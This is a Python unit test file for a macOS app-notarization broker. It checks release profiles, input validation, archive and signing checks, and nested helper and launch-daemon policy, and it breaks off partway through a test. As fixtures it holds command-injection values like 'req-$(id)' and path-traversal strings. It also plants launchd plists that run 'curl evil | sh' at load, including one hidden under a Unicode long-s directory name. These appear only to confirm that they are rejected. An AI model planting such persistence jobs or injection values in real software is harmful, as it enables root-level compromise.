from __future__ import annotations

import importlib.util
import inspect
import json
import plistlib
import re
import stat
import struct
import subprocess
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock


ROOT = Path(__file__).resolve().parent.parent
SPEC = importlib.util.spec_from_file_location("broker", ROOT / "scripts" / "broker.py")
assert SPEC and SPEC.loader
broker = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(broker)


def macho_with_info_plist(payload: bytes, *, order: str = "<", is_64: bool = True) -> bytes:
    """Build a minimal Mach-O image carrying a __TEXT,__info_plist section."""
    magics = {
        ("<", True): b"\xcf\xfa\xed\xfe",
        (">", True): b"\xfe\xed\xfa\xcf",
        ("<", False): b"\xce\xfa\xed\xfe",
        (">", False): b"\xfe\xed\xfa\xce",
    }
    segname = b"__TEXT".ljust(16, b"\0")
    sectname = b"__info_plist".ljust(16, b"\0")
    header_size = 32 if is_64 else 28
    section_size = 80 if is_64 else 68
    segment_size = (72 if is_64 else 56) + section_size
    offset = header_size + segment_size

    if is_64:
        segment = struct.pack(
            f"{order}II16sQQQQiiII", 0x19, segment_size, segname, 0, 0, 0, 0, 0, 0, 1, 0
        )
        section = struct.pack(
            f"{order}16s16sQQIIIIIIII",
            sectname, segname, 0, len(payload), offset, 0, 0, 0, 0, 0, 0, 0,
        )
        header = magics[(order, is_64)] + struct.pack(
            f"{order}IIIIIII", 0x0100000C, 0, 2, 1, segment_size, 0, 0
        )
    else:
        segment = struct.pack(
            f"{order}II16sIIIIiiII", 0x01, segment_size, segname, 0, 0, 0, 0, 0, 0, 1, 0
        )
        section = struct.pack(
            f"{order}16s16sIIIIIIIII",
            sectname, segname, 0, len(payload), offset, 0, 0, 0, 0, 0, 0,
        )
        header = magics[(order, is_64)] + struct.pack(
            f"{order}IIIIII", 0x0C, 0, 2, 1, segment_size, 0
        )
    return header + segment + section + payload


def fat_wrapper(image: bytes, *, count: int = 1) -> bytes:
    header = struct.pack(">II", 0xCAFEBABE, count)
    offset = 8 + 20 * count
    entries = b"".join(
        struct.pack(">IIIII", 0x0100000C, 0, offset, len(image), 0) for _ in range(count)
    )
    return header + entries + image


class ProfileTests(unittest.TestCase):
    def test_all_existing_profiles_are_declared(self) -> None:
        profiles = broker.load_profiles()
        self.assertEqual(
            set(profiles),
            {
                "md2loop",
                "openconnct",
                "opendefendrwatchr",
                "openlens",
                "openwritr",
                "ptionsplus",
                "spacemender",
                "teleprompter",
            },
        )

    def test_profile_repository_identities_are_fixed(self) -> None:
        profiles = broker.load_profiles()
        self.assertEqual(profiles["md2loop"]["repository_id"], 1168645937)
        self.assertEqual(profiles["opendefendrwatchr"]["repository_id"], 1342759464)
        self.assertEqual(profiles["openconnct"]["repository_id"], 1342923126)
        self.assertEqual(profiles["openwritr"]["repository_id"], 1165782217)
        self.assertEqual(profiles["ptionsplus"]["repository_id"], 1165009675)
        self.assertEqual(profiles["openlens"]["repository_id"], 1341576271)
        self.assertEqual(profiles["spacemender"]["repository_id"], 1339151393)
        self.assertEqual(profiles["teleprompter"]["repository_id"], 1339874326)

    def test_artifact_names_preserve_existing_release_contracts(self) -> None:
        profiles = broker.load_profiles()
        names = {
            name: [artifact["name"] for artifact in profile["artifacts"]]
            for name, profile in profiles.items()
        }
        self.assertEqual(names["md2loop"], ["md2loop-{version}-macos.dmg"])
        self.assertEqual(
            names["opendefendrwatchr"],
            ["OpenDefendrWatchr-v{version}-macOS-arm64.zip"],
        )
        self.assertEqual(
            names["openwritr"],
            [
                "OpenWritr-v{version}-macOS-arm64.zip",
                "OpenWritr-v{version}-macOS-arm64.dmg",
            ],
        )
        self.assertEqual(names["ptionsplus"], ["Ptions+.zip", "Ptions+.dmg"])
        self.assertEqual(
            names["spacemender"],
            [
                "SpaceMender-v{version}-macOS-arm64.zip",
                "SpaceMender-v{version}-macOS-arm64.dmg",
            ],
        )
        self.assertEqual(
            names["teleprompter"],
            ["Teleprompter-Mirror-v{version}-macOS-arm64.zip"],
        )
        self.assertEqual(
            names["openconnct"],
            [
                "OpenConnct-v{version}-macOS-universal.zip",
                "OpenConnct-v{version}-macOS-universal.dmg",
            ],
        )

    def test_profiles_shipping_nested_code_are_declared(self) -> None:
        # spacemender ships a privileged XPC helper; openconnct ships a CoreAudio
        # HAL plug-in; openlens ships a camera system extension. Any new profile
        # that embeds nested code must be added here deliberately so the extra
        # signing and validation surface is reviewed.
        profiles = broker.load_profiles()
        shipping = {
            name for name, profile in profiles.items() if profile.get("nested_executables")
        }
        self.assertEqual(shipping, {"openconnct", "openlens", "spacemender"})

    def test_spacemender_declares_exactly_one_privileged_helper(self) -> None:
        profile = broker.load_profiles()["spacemender"]
        specs = profile["nested_executables"]
        self.assertEqual(len(specs), 1)
        spec = specs[0]
        self.assertEqual(spec["path"], "Contents/MacOS/SpaceMenderDefenderHelper")
        self.assertEqual(spec["identifier"], "app.spacemender.SpaceMender.DefenderHelper")
        self.assertEqual(
            spec["launch_daemon"]["path"],
            "Contents/Library/LaunchDaemons/app.spacemender.SpaceMender.DefenderHelper.plist",
        )
        self.assertEqual(spec["launch_daemon"]["label"], spec["identifier"])

    def test_spacemender_helper_client_requirement_is_pinned_to_the_profile(self) -> None:
        """The helper only accepts a client signed by this team.

        The expectation is written with placeholders so that changing the team
        ID or bundle identifier in the profile cannot leave a stale requirement
        silently accepted: a helper compiled against the old values stops
        matching and the preflight rejects it.
        """
        profile = broker.load_profiles()["spacemender"]
        spec = profile["nested_executables"][0]
        rendered = broker.render_expected_value(
            spec["embedded_info_plist"]["SpaceMenderAuthorizedClientRequirement"],
            profile,
            spec,
        )
        self.assertEqual(
            rendered,
            'anchor apple generic and identifier "app.spacemender.SpaceMender" '
            'and certificate leaf[subject.OU] = "G69Z5BNY97"',
        )


class RequestSurfaceTests(unittest.TestCase):
    """The dispatch surfaces must list exactly the profiles that exist.

    A profile that is registered but missing from request.sh or the workflow
    dropdown looks onboarded and is documented as usable, yet every attempt to
    release it is rejected before it reaches the broker.
    """

    def _profile_names(self) -> set[str]:
        return set(broker.load_profiles())

    def test_request_script_accepts_every_profile(self) -> None:
        script = (ROOT / "scripts" / "request.sh").read_text(encoding="utf-8")
        match = re.search(r"^\s*([a-z0-9|-]+)\)\s*;;", script, re.MULTILINE)
        self.assertIsNotNone(match, "request.sh no longer has a recognisable app allowlist")
        self.assertEqual(set(match.group(1).split("|")), self._profile_names())

    def test_request_usage_message_lists_every_profile(self) -> None:
        script = (ROOT / "scripts" / "request.sh").read_text(encoding="utf-8")
        match = re.search(r"Usage: \$0 \{([a-z0-9|-]+)\}", script)
        self.assertIsNotNone(match, "request.sh no longer has a recognisable usage message")
        self.assertEqual(set(match.group(1).split("|")), self._profile_names())

    def test_workflow_dropdown_offers_every_profile(self) -> None:
        workflow = (ROOT / ".github" / "workflows" / "notarize.yml").read_text(encoding="utf-8")
        block = re.search(r"options:\n((?:\s*-\s*[a-z0-9-]+\n)+)", workflow)
        self.assertIsNotNone(block, "notarize.yml no longer has a recognisable profile dropdown")
        offered = {line.strip().lstrip("- ").strip() for line in block.group(1).splitlines() if line.strip()}
        self.assertEqual(offered, self._profile_names())


class InputValidationTests(unittest.TestCase):
    def test_tag_validation(self) -> None:
        self.assertEqual(broker.validate_tag("v1.2.3"), "1.2.3")
        self.assertEqual(broker.validate_tag("v1.2.3-rc.1"), "1.2.3-rc.1")
        for invalid in (
            "main",
            "1.2.3",
            "v1",
            "v1.2.3/../../main",
            "v1.2.3$(id)",
            "v1.2.3\nmain",
        ):
            with self.subTest(invalid=invalid):
                with self.assertRaises(broker.BrokerError):
                    broker.validate_tag(invalid)

    def test_request_id_validation(self) -> None:
        self.assertEqual(broker.normalize_request_id("req-123"), "req-123")
        for invalid in ("../request", "with space", "req-$(id)", "x" * 81):
            with self.subTest(invalid=invalid):
                with self.assertRaises(broker.BrokerError):
                    broker.normalize_request_id(invalid)

    def test_zip_path_validation_rejects_traversal(self) -> None:
        for invalid in ("../evil", "/absolute", "Root.app\\..\\evil", "a/\x00b"):
            with self.subTest(invalid=invalid):
                with self.assertRaises(broker.BrokerError):
                    broker.normalized_zip_path(invalid)


class ArchiveValidationTests(unittest.TestCase):
    def setUp(self) -> None:
        self.profile = broker.get_profile("teleprompter")

    def test_archive_rejects_content_outside_expected_bundle(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            archive = Path(temporary) / "bad.zip"
            with zipfile.ZipFile(archive, "w") as handle:
                handle.writestr("unexpected.txt", "bad")
            with self.assertRaises(broker.BrokerError):
                broker.inspect_zip(archive, self.profile)

    def test_archive_rejects_symlink_entries(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            archive = Path(temporary) / "symlink.zip"
            entry = zipfile.ZipInfo("Teleprompter Mirror.app/Contents/MacOS/link")
            entry.create_system = 3
            entry.external_attr = (stat.S_IFLNK | 0o777) << 16
            with zipfile.ZipFile(archive, "w") as handle:
                handle.writestr(entry, "../../outside")
            with self.assertRaises(broker.BrokerError):
                broker.inspect_zip(archive, self.profile)

    def test_archive_rejects_appledouble_metadata(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            archive = Path(temporary) / "appledouble.zip"
            with zipfile.ZipFile(archive, "w") as handle:
                handle.writestr("Teleprompter Mirror.app/Contents/._Info.plist", "bad")
            with self.assertRaises(broker.BrokerError):
                broker.inspect_zip(archive, self.profile)


class SignedEntitlementsTests(unittest.TestCase):
    ENTITLEMENTS_XML = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
        b'"https://www.apple.com/DTDs/PropertyList-1.0.dtd">'
        b'<plist version="1.0"><dict/></plist>\n'
    )

    def test_codesign_diagnostics_are_not_appended_to_stdout_plist(self) -> None:
        completed = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout=self.ENTITLEMENTS_XML,
            stderr=(
                b"Executable=/tmp/Teleprompter Mirror.app/Contents/MacOS/"
                b"TeleprompterMirror\n"
            ),
        )
        with mock.patch.object(
            broker.subprocess, "run", return_value=completed
        ) as codesign:
            entitlements = broker.read_signed_entitlements(
                Path("/tmp/Teleprompter Mirror.app")
            )

        self.assertEqual(entitlements, {})
        codesign.assert_called_once_with(
            [
                "codesign",
                "-d",
                "--xml",
                "--entitlements",
                "-",
                "/tmp/Teleprompter Mirror.app",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )

    def test_xml_plist_is_bounded_when_codesign_uses_stderr(self) -> None:
        completed = subprocess.CompletedProcess(
            args=[],
            returncode=0,
            stdout=b"",
            stderr=(
                b"Executable=/tmp/Test.app/Contents/MacOS/Test\n"
                + self.ENTITLEMENTS_XML
                + b"codesign diagnostic after plist\n"
            ),
        )
        with mock.patch.object(broker.subprocess, "run", return_value=completed):
            entitlements = broker.read_signed_entitlements(Path("/tmp/Test.app"))

        self.assertEqual(entitlements, {})


class NestedExecutablePolicyTests(unittest.TestCase):
    def base_profile(self, **overrides: object) -> dict:
        profile: dict = {
            "executable": "Demo",
            "bundle_identifier": "com.example.Demo",
            "team_id": "ABCDE12345",
            "nested_executables": [
                {
                    "path": "Contents/MacOS/DemoHelper",
                    "identifier": "com.example.Demo.Helper",
                    "entitlements": "entitlements/teleprompter.plist",
                }
            ],
        }
        profile.update(overrides)
        return profile

    def assert_rejected(self, profile: dict) -> None:
        with self.assertRaises(broker.BrokerError):
            broker.validate_nested_executable_policy("demo", profile)

    def test_minimal_policy_is_accepted(self) -> None:
        broker.validate_nested_executable_policy("demo", self.base_profile())

    def test_profile_without_nested_executables_is_unaffected(self) -> None:
        broker.validate_nested_executable_policy("demo", {"executable": "Demo"})

    def test_team_id_is_required_for_nested_code(self) -> None:
        profile = self.base_profile()
        del profile["team_id"]
        self.assert_rejected(profile)

    def test_unsafe_nested_paths_are_rejected(self) -> None:
        for path in (
            "Contents/../../evil",
            "/Contents/MacOS/Helper",
            "Contents/MacOS/*",
            "Contents/MacOS/../Helper",
            "MacOS/Helper",
            "Contents",
            "",
        ):
            with self.subTest(path=path):
                profile = self.base_profile()
                profile["nested_executables"][0]["path"] = path
                self.assert_rejected(profile)

    def test_main_executable_cannot_be_redeclared_as_nested(self) -> None:
        profile = self.base_profile()
        profile["nested_executables"][0]["path"] = "Contents/MacOS/Demo"
        self.assert_rejected(profile)

    def test_duplicate_nested_paths_are_rejected(self) -> None:
        profile = self.base_profile()
        profile["nested_executables"].append(dict(profile["nested_executables"][0]))
        self.assert_rejected(profile)

    def test_unknown_nested_fields_are_rejected(self) -> None:
        profile = self.base_profile()
        profile["nested_executables"][0]["codesign_flags"] = "--deep"
        self.assert_rejected(profile)

    def test_nested_entitlements_cannot_escape_the_profile_directory(self) -> None:
        profile = self.base_profile()
        profile["nested_executables"][0]["entitlements"] = "../scripts/broker.py"
        self.assert_rejected(profile)

    def test_empty_nested_list_must_be_omitted(self) -> None:
        self.assert_rejected(self.base_profile(nested_executables=[]))

    def test_embedded_info_plist_placeholders_are_restricted(self) -> None:
        profile = self.base_profile()
        profile["nested_executables"][0]["embedded_info_plist"] = {"Key": "{apple_password}"}
        self.assert_rejected(profile)

    def test_embedded_info_plist_supports_declared_placeholders(self) -> None:
        profile = self.base_profile()
        profile["nested_executables"][0]["embedded_info_plist"] = {
            "Requirement": 'identifier "{bundle_identifier}" and OU = "{team_id}"'
        }
        broker.validate_nested_executable_policy("demo", profile)

    def test_launch_daemon_policy_is_accepted(self) -> None:
        profile = self.base_profile()
        profile["nested_executables"][0]["launch_daemon"] = {
            "path": "Contents/Library/LaunchDaemons/com.example.Demo.Helper.plist",
            "label": "com.example.Demo.Helper",
        }
        broker.validate_nested_executable_policy("demo", profile)

    def test_launch_daemon_must_live_in_the_launch_daemons_directory(self) -> None:
        profile = self.base_profile()
        profile["nested_executables"][0]["launch_daemon"] = {
            "path": "Contents/Resources/daemon.plist",
            "label": "com.example.Demo.Helper",
        }
        self.assert_rejected(profile)

    def test_launch_daemon_requires_exactly_path_and_label(self) -> None:
        profile = self.base_profile()
        profile["nested_executables"][0]["launch_daemon"] = {
            "path": "Contents/Library/LaunchDaemons/com.example.Demo.Helper.plist"
        }
        self.assert_rejected(profile)

    def test_invalid_team_id_is_rejected_by_the_schema(self) -> None:
        for team_id in ("abcde12345", "ABCDE1234", "ABCDE123456", "ABCDE 1234"):
            with self.subTest(team_id=team_id):
                self.assertIsNone(broker.TEAM_ID_PATTERN.fullmatch(team_id))
        self.assertIsNotNone(broker.TEAM_ID_PATTERN.fullmatch("ABCDE12345"))

    def plugin_profile(self, **overrides: object) -> dict:
        # A CoreAudio HAL plug-in: a bundle whose own Mach-O is the declared nested
        # executable, with no launch daemon because coreaudiod loads it directly.
        profile: dict = {
            "executable": "Demo",
            "bundle_identifier": "com.example.Demo",
            "team_id": "ABCDE12345",
            "nested_executables": [
                {
                    "path": "Contents/Library/Audio/Plug-Ins/HAL/Demo.driver/Contents/MacOS/Demo",
                    "identifier": "com.example.Demo.driver",
                    "entitlements": "entitlements/teleprompter.plist",
                    "plugin_bundle": {
                        "path": "Contents/Library/Audio/Plug-Ins/HAL/Demo.driver",
                        "identifier": "com.example.Demo.driver",
                        "package_type": "BNDL",
                    },
                }
            ],
        }
        profile.update(overrides)
        return profile

    def test_plugin_bundle_policy_is_accepted(self) -> None:
        broker.validate_nested_executable_policy("demo", self.plugin_profile())

    def test_plugin_bundle_cannot_be_combined_with_a_launch_daemon(self) -> None:
        profile = self.plugin_profile()
        profile["nested_executables"][0]["launch_daemon"] = {
            "path": "Contents/Library/LaunchDaemons/com.example.Demo.driver.plist",
            "label": "com.example.Demo.driver",
        }
        self.assert_rejected(profile)

    def test_plugin_bundle_requires_exactly_path_identifier_and_package_type(self) -> None:
        for plugin in (
            {"path": "Contents/Library/Audio/Plug-Ins/HAL/Demo.driver", "identifier": "com.example.Demo.driver"},
            {
                "path": "Contents/Library/Audio/Plug-Ins/HAL/Demo.driver",
                "identifier": "com.example.Demo.driver",
                "package_type": "BNDL",
                "label": "extra",
            },
        ):
            with self.subTest(plugin=plugin):
                profile = self.plugin_profile()
                profile["nested_executables"][0]["plugin_bundle"] = plugin
                self.assert_rejected(profile)

    def test_plugin_bundle_must_end_in_a_plugin_suffix(self) -> None:
        profile = self.plugin_profile()
        profile["nested_executables"][0]["plugin_bundle"]["path"] = (
            "Contents/Library/Audio/Plug-Ins/HAL/Demo.bundle"
        )
        profile["nested_executables"][0]["path"] = (
            "Contents/Library/Audio/Plug-Ins/HAL/Demo.bundle/Contents/MacOS/Demo"
        )
        self.assert_rejected(profile)

    def test_plugin_bundle_executable_must_live_inside_the_bundle(self) -> None:
        profile = self.plugin_profile()
        profile["nested_executables"][0]["path"] = "Contents/MacOS/Demo"
        self.assert_rejected(profile)

    def test_plugin_bundle_package_type_is_restricted(self) -> None:
        profile = self.plugin_profile()
        profile["nested_executables"][0]["plugin_bundle"]["package_type"] = "APPL"
        self.assert_rejected(profile)

    def test_plugin_bundle_path_must_be_safe(self) -> None:
        profile = self.plugin_profile()
        profile["nested_executables"][0]["plugin_bundle"]["path"] = "../evil.driver"
        self.assert_rejected(profile)

    def system_extension_profile(self, **overrides: object) -> dict:
        # A camera System Extension: same shape as a HAL plug-in, but launchd-free
        # and carrying the SYSX package type instead of BNDL.
        profile: dict = {
            "executable": "Demo",
            "bundle_identifier": "com.example.Demo",
            "team_id": "ABCDE12345",
            "nested_executables": [
                {
                    "path": (
                        "Contents/Library/SystemExtensions/com.example.Demo.camera"
                        ".systemextension/Contents/MacOS/com.example.Demo.camera"
                    ),
                    "identifier": "com.example.Demo.camera",
                    "entitlements": "entitlements/teleprompter.plist",
                    "plugin_bundle": {
                        "path": (
                            "Contents/Library/SystemExtensions/com.example.Demo.camera"
                            ".systemextension"
                        ),
                        "identifier": "com.example.Demo.camera",
                        "package_type": "SYSX",
                    },
                }
            ],
        }
        profile.update(overrides)
        return profile

    def test_system_extension_policy_is_accepted(self) -> None:
        broker.validate_nested_executable_policy("demo", self.system_extension_profile())

    def test_system_extension_must_declare_the_sysx_package_type(self) -> None:
        profile = self.system_extension_profile()
        profile["nested_executables"][0]["plugin_bundle"]["package_type"] = "BNDL"
        self.assert_rejected(profile)

    def test_plugin_suffix_and_package_type_must_agree(self) -> None:
        # The two kinds are pinned to each other, so a bundle cannot borrow the
        # suffix of one and the package type of the other.
        profile = self.plugin_profile()
        profile["nested_executables"][0]["plugin_bundle"]["package_type"] = "SYSX"
        self.assert_rejected(profile)

    def test_an_application_is_never_an_embeddable_bundle(self) -> None:
        for profile in (self.plugin_profile(), self.system_extension_profile()):
            with self.subTest(profile=profile["nested_executables"][0]["identifier"]):
                profile["nested_executables"][0]["plugin_bundle"]["package_type"] = "APPL"
                self.assert_rejected(profile)

    def test_every_pinnable_suffix_is_also_a_policed_nested_bundle(self) -> None:
        # A suffix that may be pinned but is not policed as a nested bundle would
        # be allowed through undeclared, which is the opposite of the intent.
        for suffix in broker.PLUGIN_BUNDLE_SUFFIXES:
            with self.subTest(suffix=suffix):
                self.assertIn(suffix, broker.NESTED_BUNDLE_SUFFIXES)


class EmbeddedInfoPlistTests(unittest.TestCase):
    PAYLOAD = plistlib.dumps(
        {
            "CFBundleIdentifier": "com.example.Demo.Helper",
            "ClientRequirement": 'certificate leaf[subject.OU] = "ABCDE12345"',
        }
    )

    def write(self, data: bytes) -> Path:
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        path = Path(directory.name) / "helper"
        path.write_bytes(data)
        return path

    def test_reads_thin_images_in_every_supported_layout(self) -> None:
        for order in ("<", ">"):
            for is_64 in (True, False):
                with self.subTest(order=order, is_64=is_64):
                    image = macho_with_info_plist(self.PAYLOAD, order=order, is_64=is_64)
                    value = broker.read_embedded_info_plist(self.write(image))
                    self.assertEqual(value["CFBundleIdentifier"], "com.example.Demo.Helper")

    def test_reads_a_single_slice_fat_image(self) -> None:
        image = fat_wrapper(macho_with_info_plist(self.PAYLOAD))
        value = broker.read_embedded_info_plist(self.write(image))
        self.assertEqual(value["CFBundleIdentifier"], "com.example.Demo.Helper")

    def test_rejects_multi_slice_fat_images(self) -> None:
        image = fat_wrapper(macho_with_info_plist(self.PAYLOAD), count=2)
        with self.assertRaises(broker.BrokerError):
            broker.read_embedded_info_plist(self.write(image))

    def test_rejects_images_without_the_section(self) -> None:
        image = macho_with_info_plist(self.PAYLOAD).replace(
            b"__info_plist".ljust(16, b"\0"), b"__text".ljust(16, b"\0")
        )
        with self.assertRaises(broker.BrokerError):
            broker.read_embedded_info_plist(self.write(image))

    def test_rejects_a_section_pointing_outside_the_image(self) -> None:
        image = macho_with_info_plist(self.PAYLOAD)
        with self.assertRaises(broker.BrokerError):
            broker.read_embedded_info_plist(self.write(image[:-4]))

    def test_rejects_non_macho_files(self) -> None:
        with self.assertRaises(broker.BrokerError):
            broker.read_embedded_info_plist(self.write(b"not a mach-o image"))


class BundleFixtureMixin:
    ARM64_MACHO = macho_with_info_plist(
        plistlib.dumps(
            {
                "CFBundleIdentifier": "com.example.Demo.Helper",
                "ClientRequirement": 'anchor apple generic and certificate leaf[subject.OU] = "ABCDE12345"',
            }
        )
    )

    def build_profile(self) -> dict:
        return {
            "bundle_name": "Demo.app",
            "bundle_identifier": "com.example.Demo",
            "bundle_display_name": "Demo",
            "executable": "Demo",
            "package_type": "APPL",
            "architectures": ["arm64"],
            "minimum_system_version": "14.0",
            "team_id": "ABCDE12345",
            "max_files": 500,
            "max_uncompressed_bytes": 10_000_000,
            "nested_executables": [
                {
                    "path": "Contents/MacOS/DemoHelper",
                    "identifier": "com.example.Demo.Helper",
                    "entitlements": "entitlements/teleprompter.plist",
                    "embedded_info_plist": {
                        "ClientRequirement": (
                            'anchor apple generic and certificate leaf[subject.OU] = "{team_id}"'
                        )
                    },
                    "launch_daemon": {
                        "path": "Contents/Library/LaunchDaemons/com.example.Demo.Helper.plist",
                        "label": "com.example.Demo.Helper",
                    },
                }
            ],
        }

    def build_bundle(self, root: Path) -> Path:
        app = root / "Demo.app"
        macos = app / "Contents" / "MacOS"
        macos.mkdir(parents=True)
        (app / "Contents" / "Resources").mkdir(parents=True)
        daemons = app / "Contents" / "Library" / "LaunchDaemons"
        daemons.mkdir(parents=True)

        (macos / "Demo").write_bytes(self.ARM64_MACHO)
        (macos / "Demo").chmod(0o755)
        (macos / "DemoHelper").write_bytes(self.ARM64_MACHO)
        (macos / "DemoHelper").chmod(0o755)
        with (daemons / "com.example.Demo.Helper.plist").open("wb") as handle:
            plistlib.dump(
                {
                    "Label": "com.example.Demo.Helper",
                    "BundleProgram": "Contents/MacOS/DemoHelper",
                },
                handle,
            )
        with (app / "Contents" / "Info.plist").open("wb") as handle:
            plistlib.dump(
                {
                    "CFBundleIdentifier": "com.example.Demo",
                    "CFBundleExecutable": "Demo",
                    "CFBundlePackageType": "APPL",
                    "CFBundleShortVersionString": "1.2.3",
                    "CFBundleVersion": "1",
                    "CFBundleDisplayName": "Demo",
                    "LSMinimumSystemVersion": "14.0",
                },
                handle,
            )
        return app

    def fake_run(self, command, *args, **kwargs):
        tool = command[0]
        if tool == "file":
            return subprocess.CompletedProcess(command, 0, stdout="Mach-O 64-bit executable arm64")
        if tool == "lipo":
            return subprocess.CompletedProcess(command, 0, stdout=self.lipo_output)
        raise AssertionError(f"unexpected command in test: {command}")

    def validate(self, app: Path, profile: dict) -> dict:
        with mock.patch.object(broker, "run", side_effect=self.fake_run):
            return broker.validate_app_tree(app, profile, "1.2.3", require_unsigned=False)


class NestedBundleValidationTests(BundleFixtureMixin, unittest.TestCase):
    def setUp(self) -> None:
        self.lipo_output = "arm64"
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name)
        self.profile = self.build_profile()
        self.app = self.build_bundle(self.root)

    def test_declared_nested_executable_is_accepted_and_recorded(self) -> None:
        result = self.validate(self.app, self.profile)
        self.assertEqual(len(result["nested_executables"]), 1)
        record = result["nested_executables"][0]
        self.assertEqual(record["path"], "Contents/MacOS/DemoHelper")
        self.assertEqual(record["identifier"], "com.example.Demo.Helper")
        self.assertEqual(record["sha256"], broker.sha256_file(self.app / record["path"]))
        self.assertEqual(record["launch_daemon"]["label"], "com.example.Demo.Helper")

    def test_undeclared_nested_macho_is_still_rejected(self) -> None:
        smuggled = self.app / "Contents" / "Resources" / "extra"
        smuggled.write_bytes(self.ARM64_MACHO)
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, self.profile)

    def test_undeclared_executable_file_is_still_rejected(self) -> None:
        script = self.app / "Contents" / "Resources" / "helper.sh"
        script.write_text("#!/bin/sh\n", encoding="utf-8")
        script.chmod(0o755)
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, self.profile)

    def test_undeclared_launch_daemon_plist_is_rejected(self) -> None:
        smuggled = (
            self.app / "Contents" / "Library" / "LaunchDaemons" / "com.attacker.root.plist"
        )
        with smuggled.open("wb") as handle:
            plistlib.dump(
                {
                    "Label": "com.attacker.root",
                    "ProgramArguments": ["/bin/sh", "-c", "curl evil | sh"],
                    "RunAtLoad": True,
                },
                handle,
            )
        with self.assertRaises(broker.BrokerError) as caught:
            self.validate(self.app, self.profile)
        self.assertIn("Undeclared launchd job definition", str(caught.exception))

    def test_undeclared_launch_agent_plist_is_rejected(self) -> None:
        agents = self.app / "Contents" / "Library" / "LaunchAgents"
        agents.mkdir(parents=True)
        with (agents / "com.attacker.agent.plist").open("wb") as handle:
            plistlib.dump({"Label": "com.attacker.agent", "RunAtLoad": True}, handle)
        with self.assertRaises(broker.BrokerError) as caught:
            self.validate(self.app, self.profile)
        self.assertIn("Undeclared launchd job definition", str(caught.exception))

    def test_subdirectory_inside_the_launch_daemon_directory_is_rejected(self) -> None:
        nested = self.app / "Contents" / "Library" / "LaunchDaemons" / "extra"
        nested.mkdir(parents=True)
        with self.assertRaises(broker.BrokerError) as caught:
            self.validate(self.app, self.profile)
        self.assertIn("Undeclared launchd job definition", str(caught.exception))

    def test_launch_daemon_directory_is_rejected_when_nothing_is_declared(self) -> None:
        profile = self.build_profile()
        profile.pop("nested_executables")
        (self.app / "Contents" / "MacOS" / "DemoHelper").unlink()
        with self.assertRaises(broker.BrokerError) as caught:
            self.validate(self.app, profile)
        self.assertIn("Undeclared launchd job definition", str(caught.exception))

    def test_miscased_launch_job_directories_are_rejected(self) -> None:
        for spelling in (
            "Library/launchdaemons",
            "Library/LAUNCHDAEMONS",
            "library/LaunchDaemons",
            "Library/launchagents",
            "LIBRARY/LAUNCHAGENTS",
            # U+017F LATIN SMALL LETTER LONG S folds to "s" on APFS, so these
            # name the canonical directories at runtime. str.lower() misses it.
            "Library/LaunchDaemon\u017f",
            "Library/LaunchAgent\u017f",
        ):
            with self.subTest(spelling=spelling):
                app = self.build_bundle(Path(tempfile.mkdtemp(dir=self.root)))
                smuggled = app / "Contents" / spelling / "com.attacker.root.plist"
                smuggled.parent.mkdir(parents=True, exist_ok=True)
                with smuggled.open("wb") as handle:
                    plistlib.dump(
                        {
                            "Label": "com.attacker.root",
                            "ProgramArguments": ["/bin/sh", "-c", "curl evil | sh"],
                        },
                        handle,
                    )
                with self.assertRaises(broker.BrokerError) as caught:
                    self.validate(app, self.profile)
                self.assertIn("Undeclared launchd job definition", str(caught.exception))

    def test_miscased_nested_bundle_directory_is_rejected(self) -> None:
        nested = self.app / "Contents" / "Resources" / "Inner.APP"
        nested.mkdir(parents=True)
        with self.assertRaises(broker.BrokerError) as caught:
            self.validate(self.app, self.profile)
        self.assertIn("Nested bundles are not allowed", str(caught.exception))

    def test_a_profile_without_nested_policy_rejects_the_same_bundle(self) -> None:
        profile = self.build_profile()
        del profile["nested_executables"]
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, profile)

    def test_missing_declared_nested_executable_is_rejected(self) -> None:
        (self.app / "Contents" / "MacOS" / "DemoHelper").unlink()
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, self.profile)

    def test_nested_architecture_mismatch_is_rejected(self) -> None:
        self.lipo_output = "arm64 x86_64"
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, self.profile)

    def test_empty_team_id_in_the_embedded_requirement_is_rejected(self) -> None:
        unsubstituted = macho_with_info_plist(
            plistlib.dumps(
                {
                    "CFBundleIdentifier": "com.example.Demo.Helper",
                    "ClientRequirement": (
                        'anchor apple generic and certificate leaf[subject.OU] = ""'
                    ),
                }
            )
        )
        helper = self.app / "Contents" / "MacOS" / "DemoHelper"
        helper.write_bytes(unsubstituted)
        helper.chmod(0o755)
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, self.profile)

    def test_launch_daemon_label_mismatch_is_rejected(self) -> None:
        plist_path = (
            self.app / "Contents" / "Library" / "LaunchDaemons" / "com.example.Demo.Helper.plist"
        )
        with plist_path.open("wb") as handle:
            plistlib.dump(
                {"Label": "com.attacker.job", "BundleProgram": "Contents/MacOS/DemoHelper"}, handle
            )
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, self.profile)

    def test_launch_daemon_pointing_at_another_program_is_rejected(self) -> None:
        plist_path = (
            self.app / "Contents" / "Library" / "LaunchDaemons" / "com.example.Demo.Helper.plist"
        )
        with plist_path.open("wb") as handle:
            plistlib.dump(
                {"Label": "com.example.Demo.Helper", "BundleProgram": "Contents/MacOS/Demo"}, handle
            )
        with self.assertRaises(broker.BrokerError):
            self.validate(self.app, self.profile)

    def test_launch_daemon_absolute_program_keys_are_rejected(self) -> None:
        for key, value in (("Program", "/usr/bin/true"), ("ProgramArguments", ["/usr/bin/true"])):
            with self.subTest(key=key):
                plist_path = (
                    self.app
                    / "Contents"
                    / "Library"
                    / "LaunchDaemons"
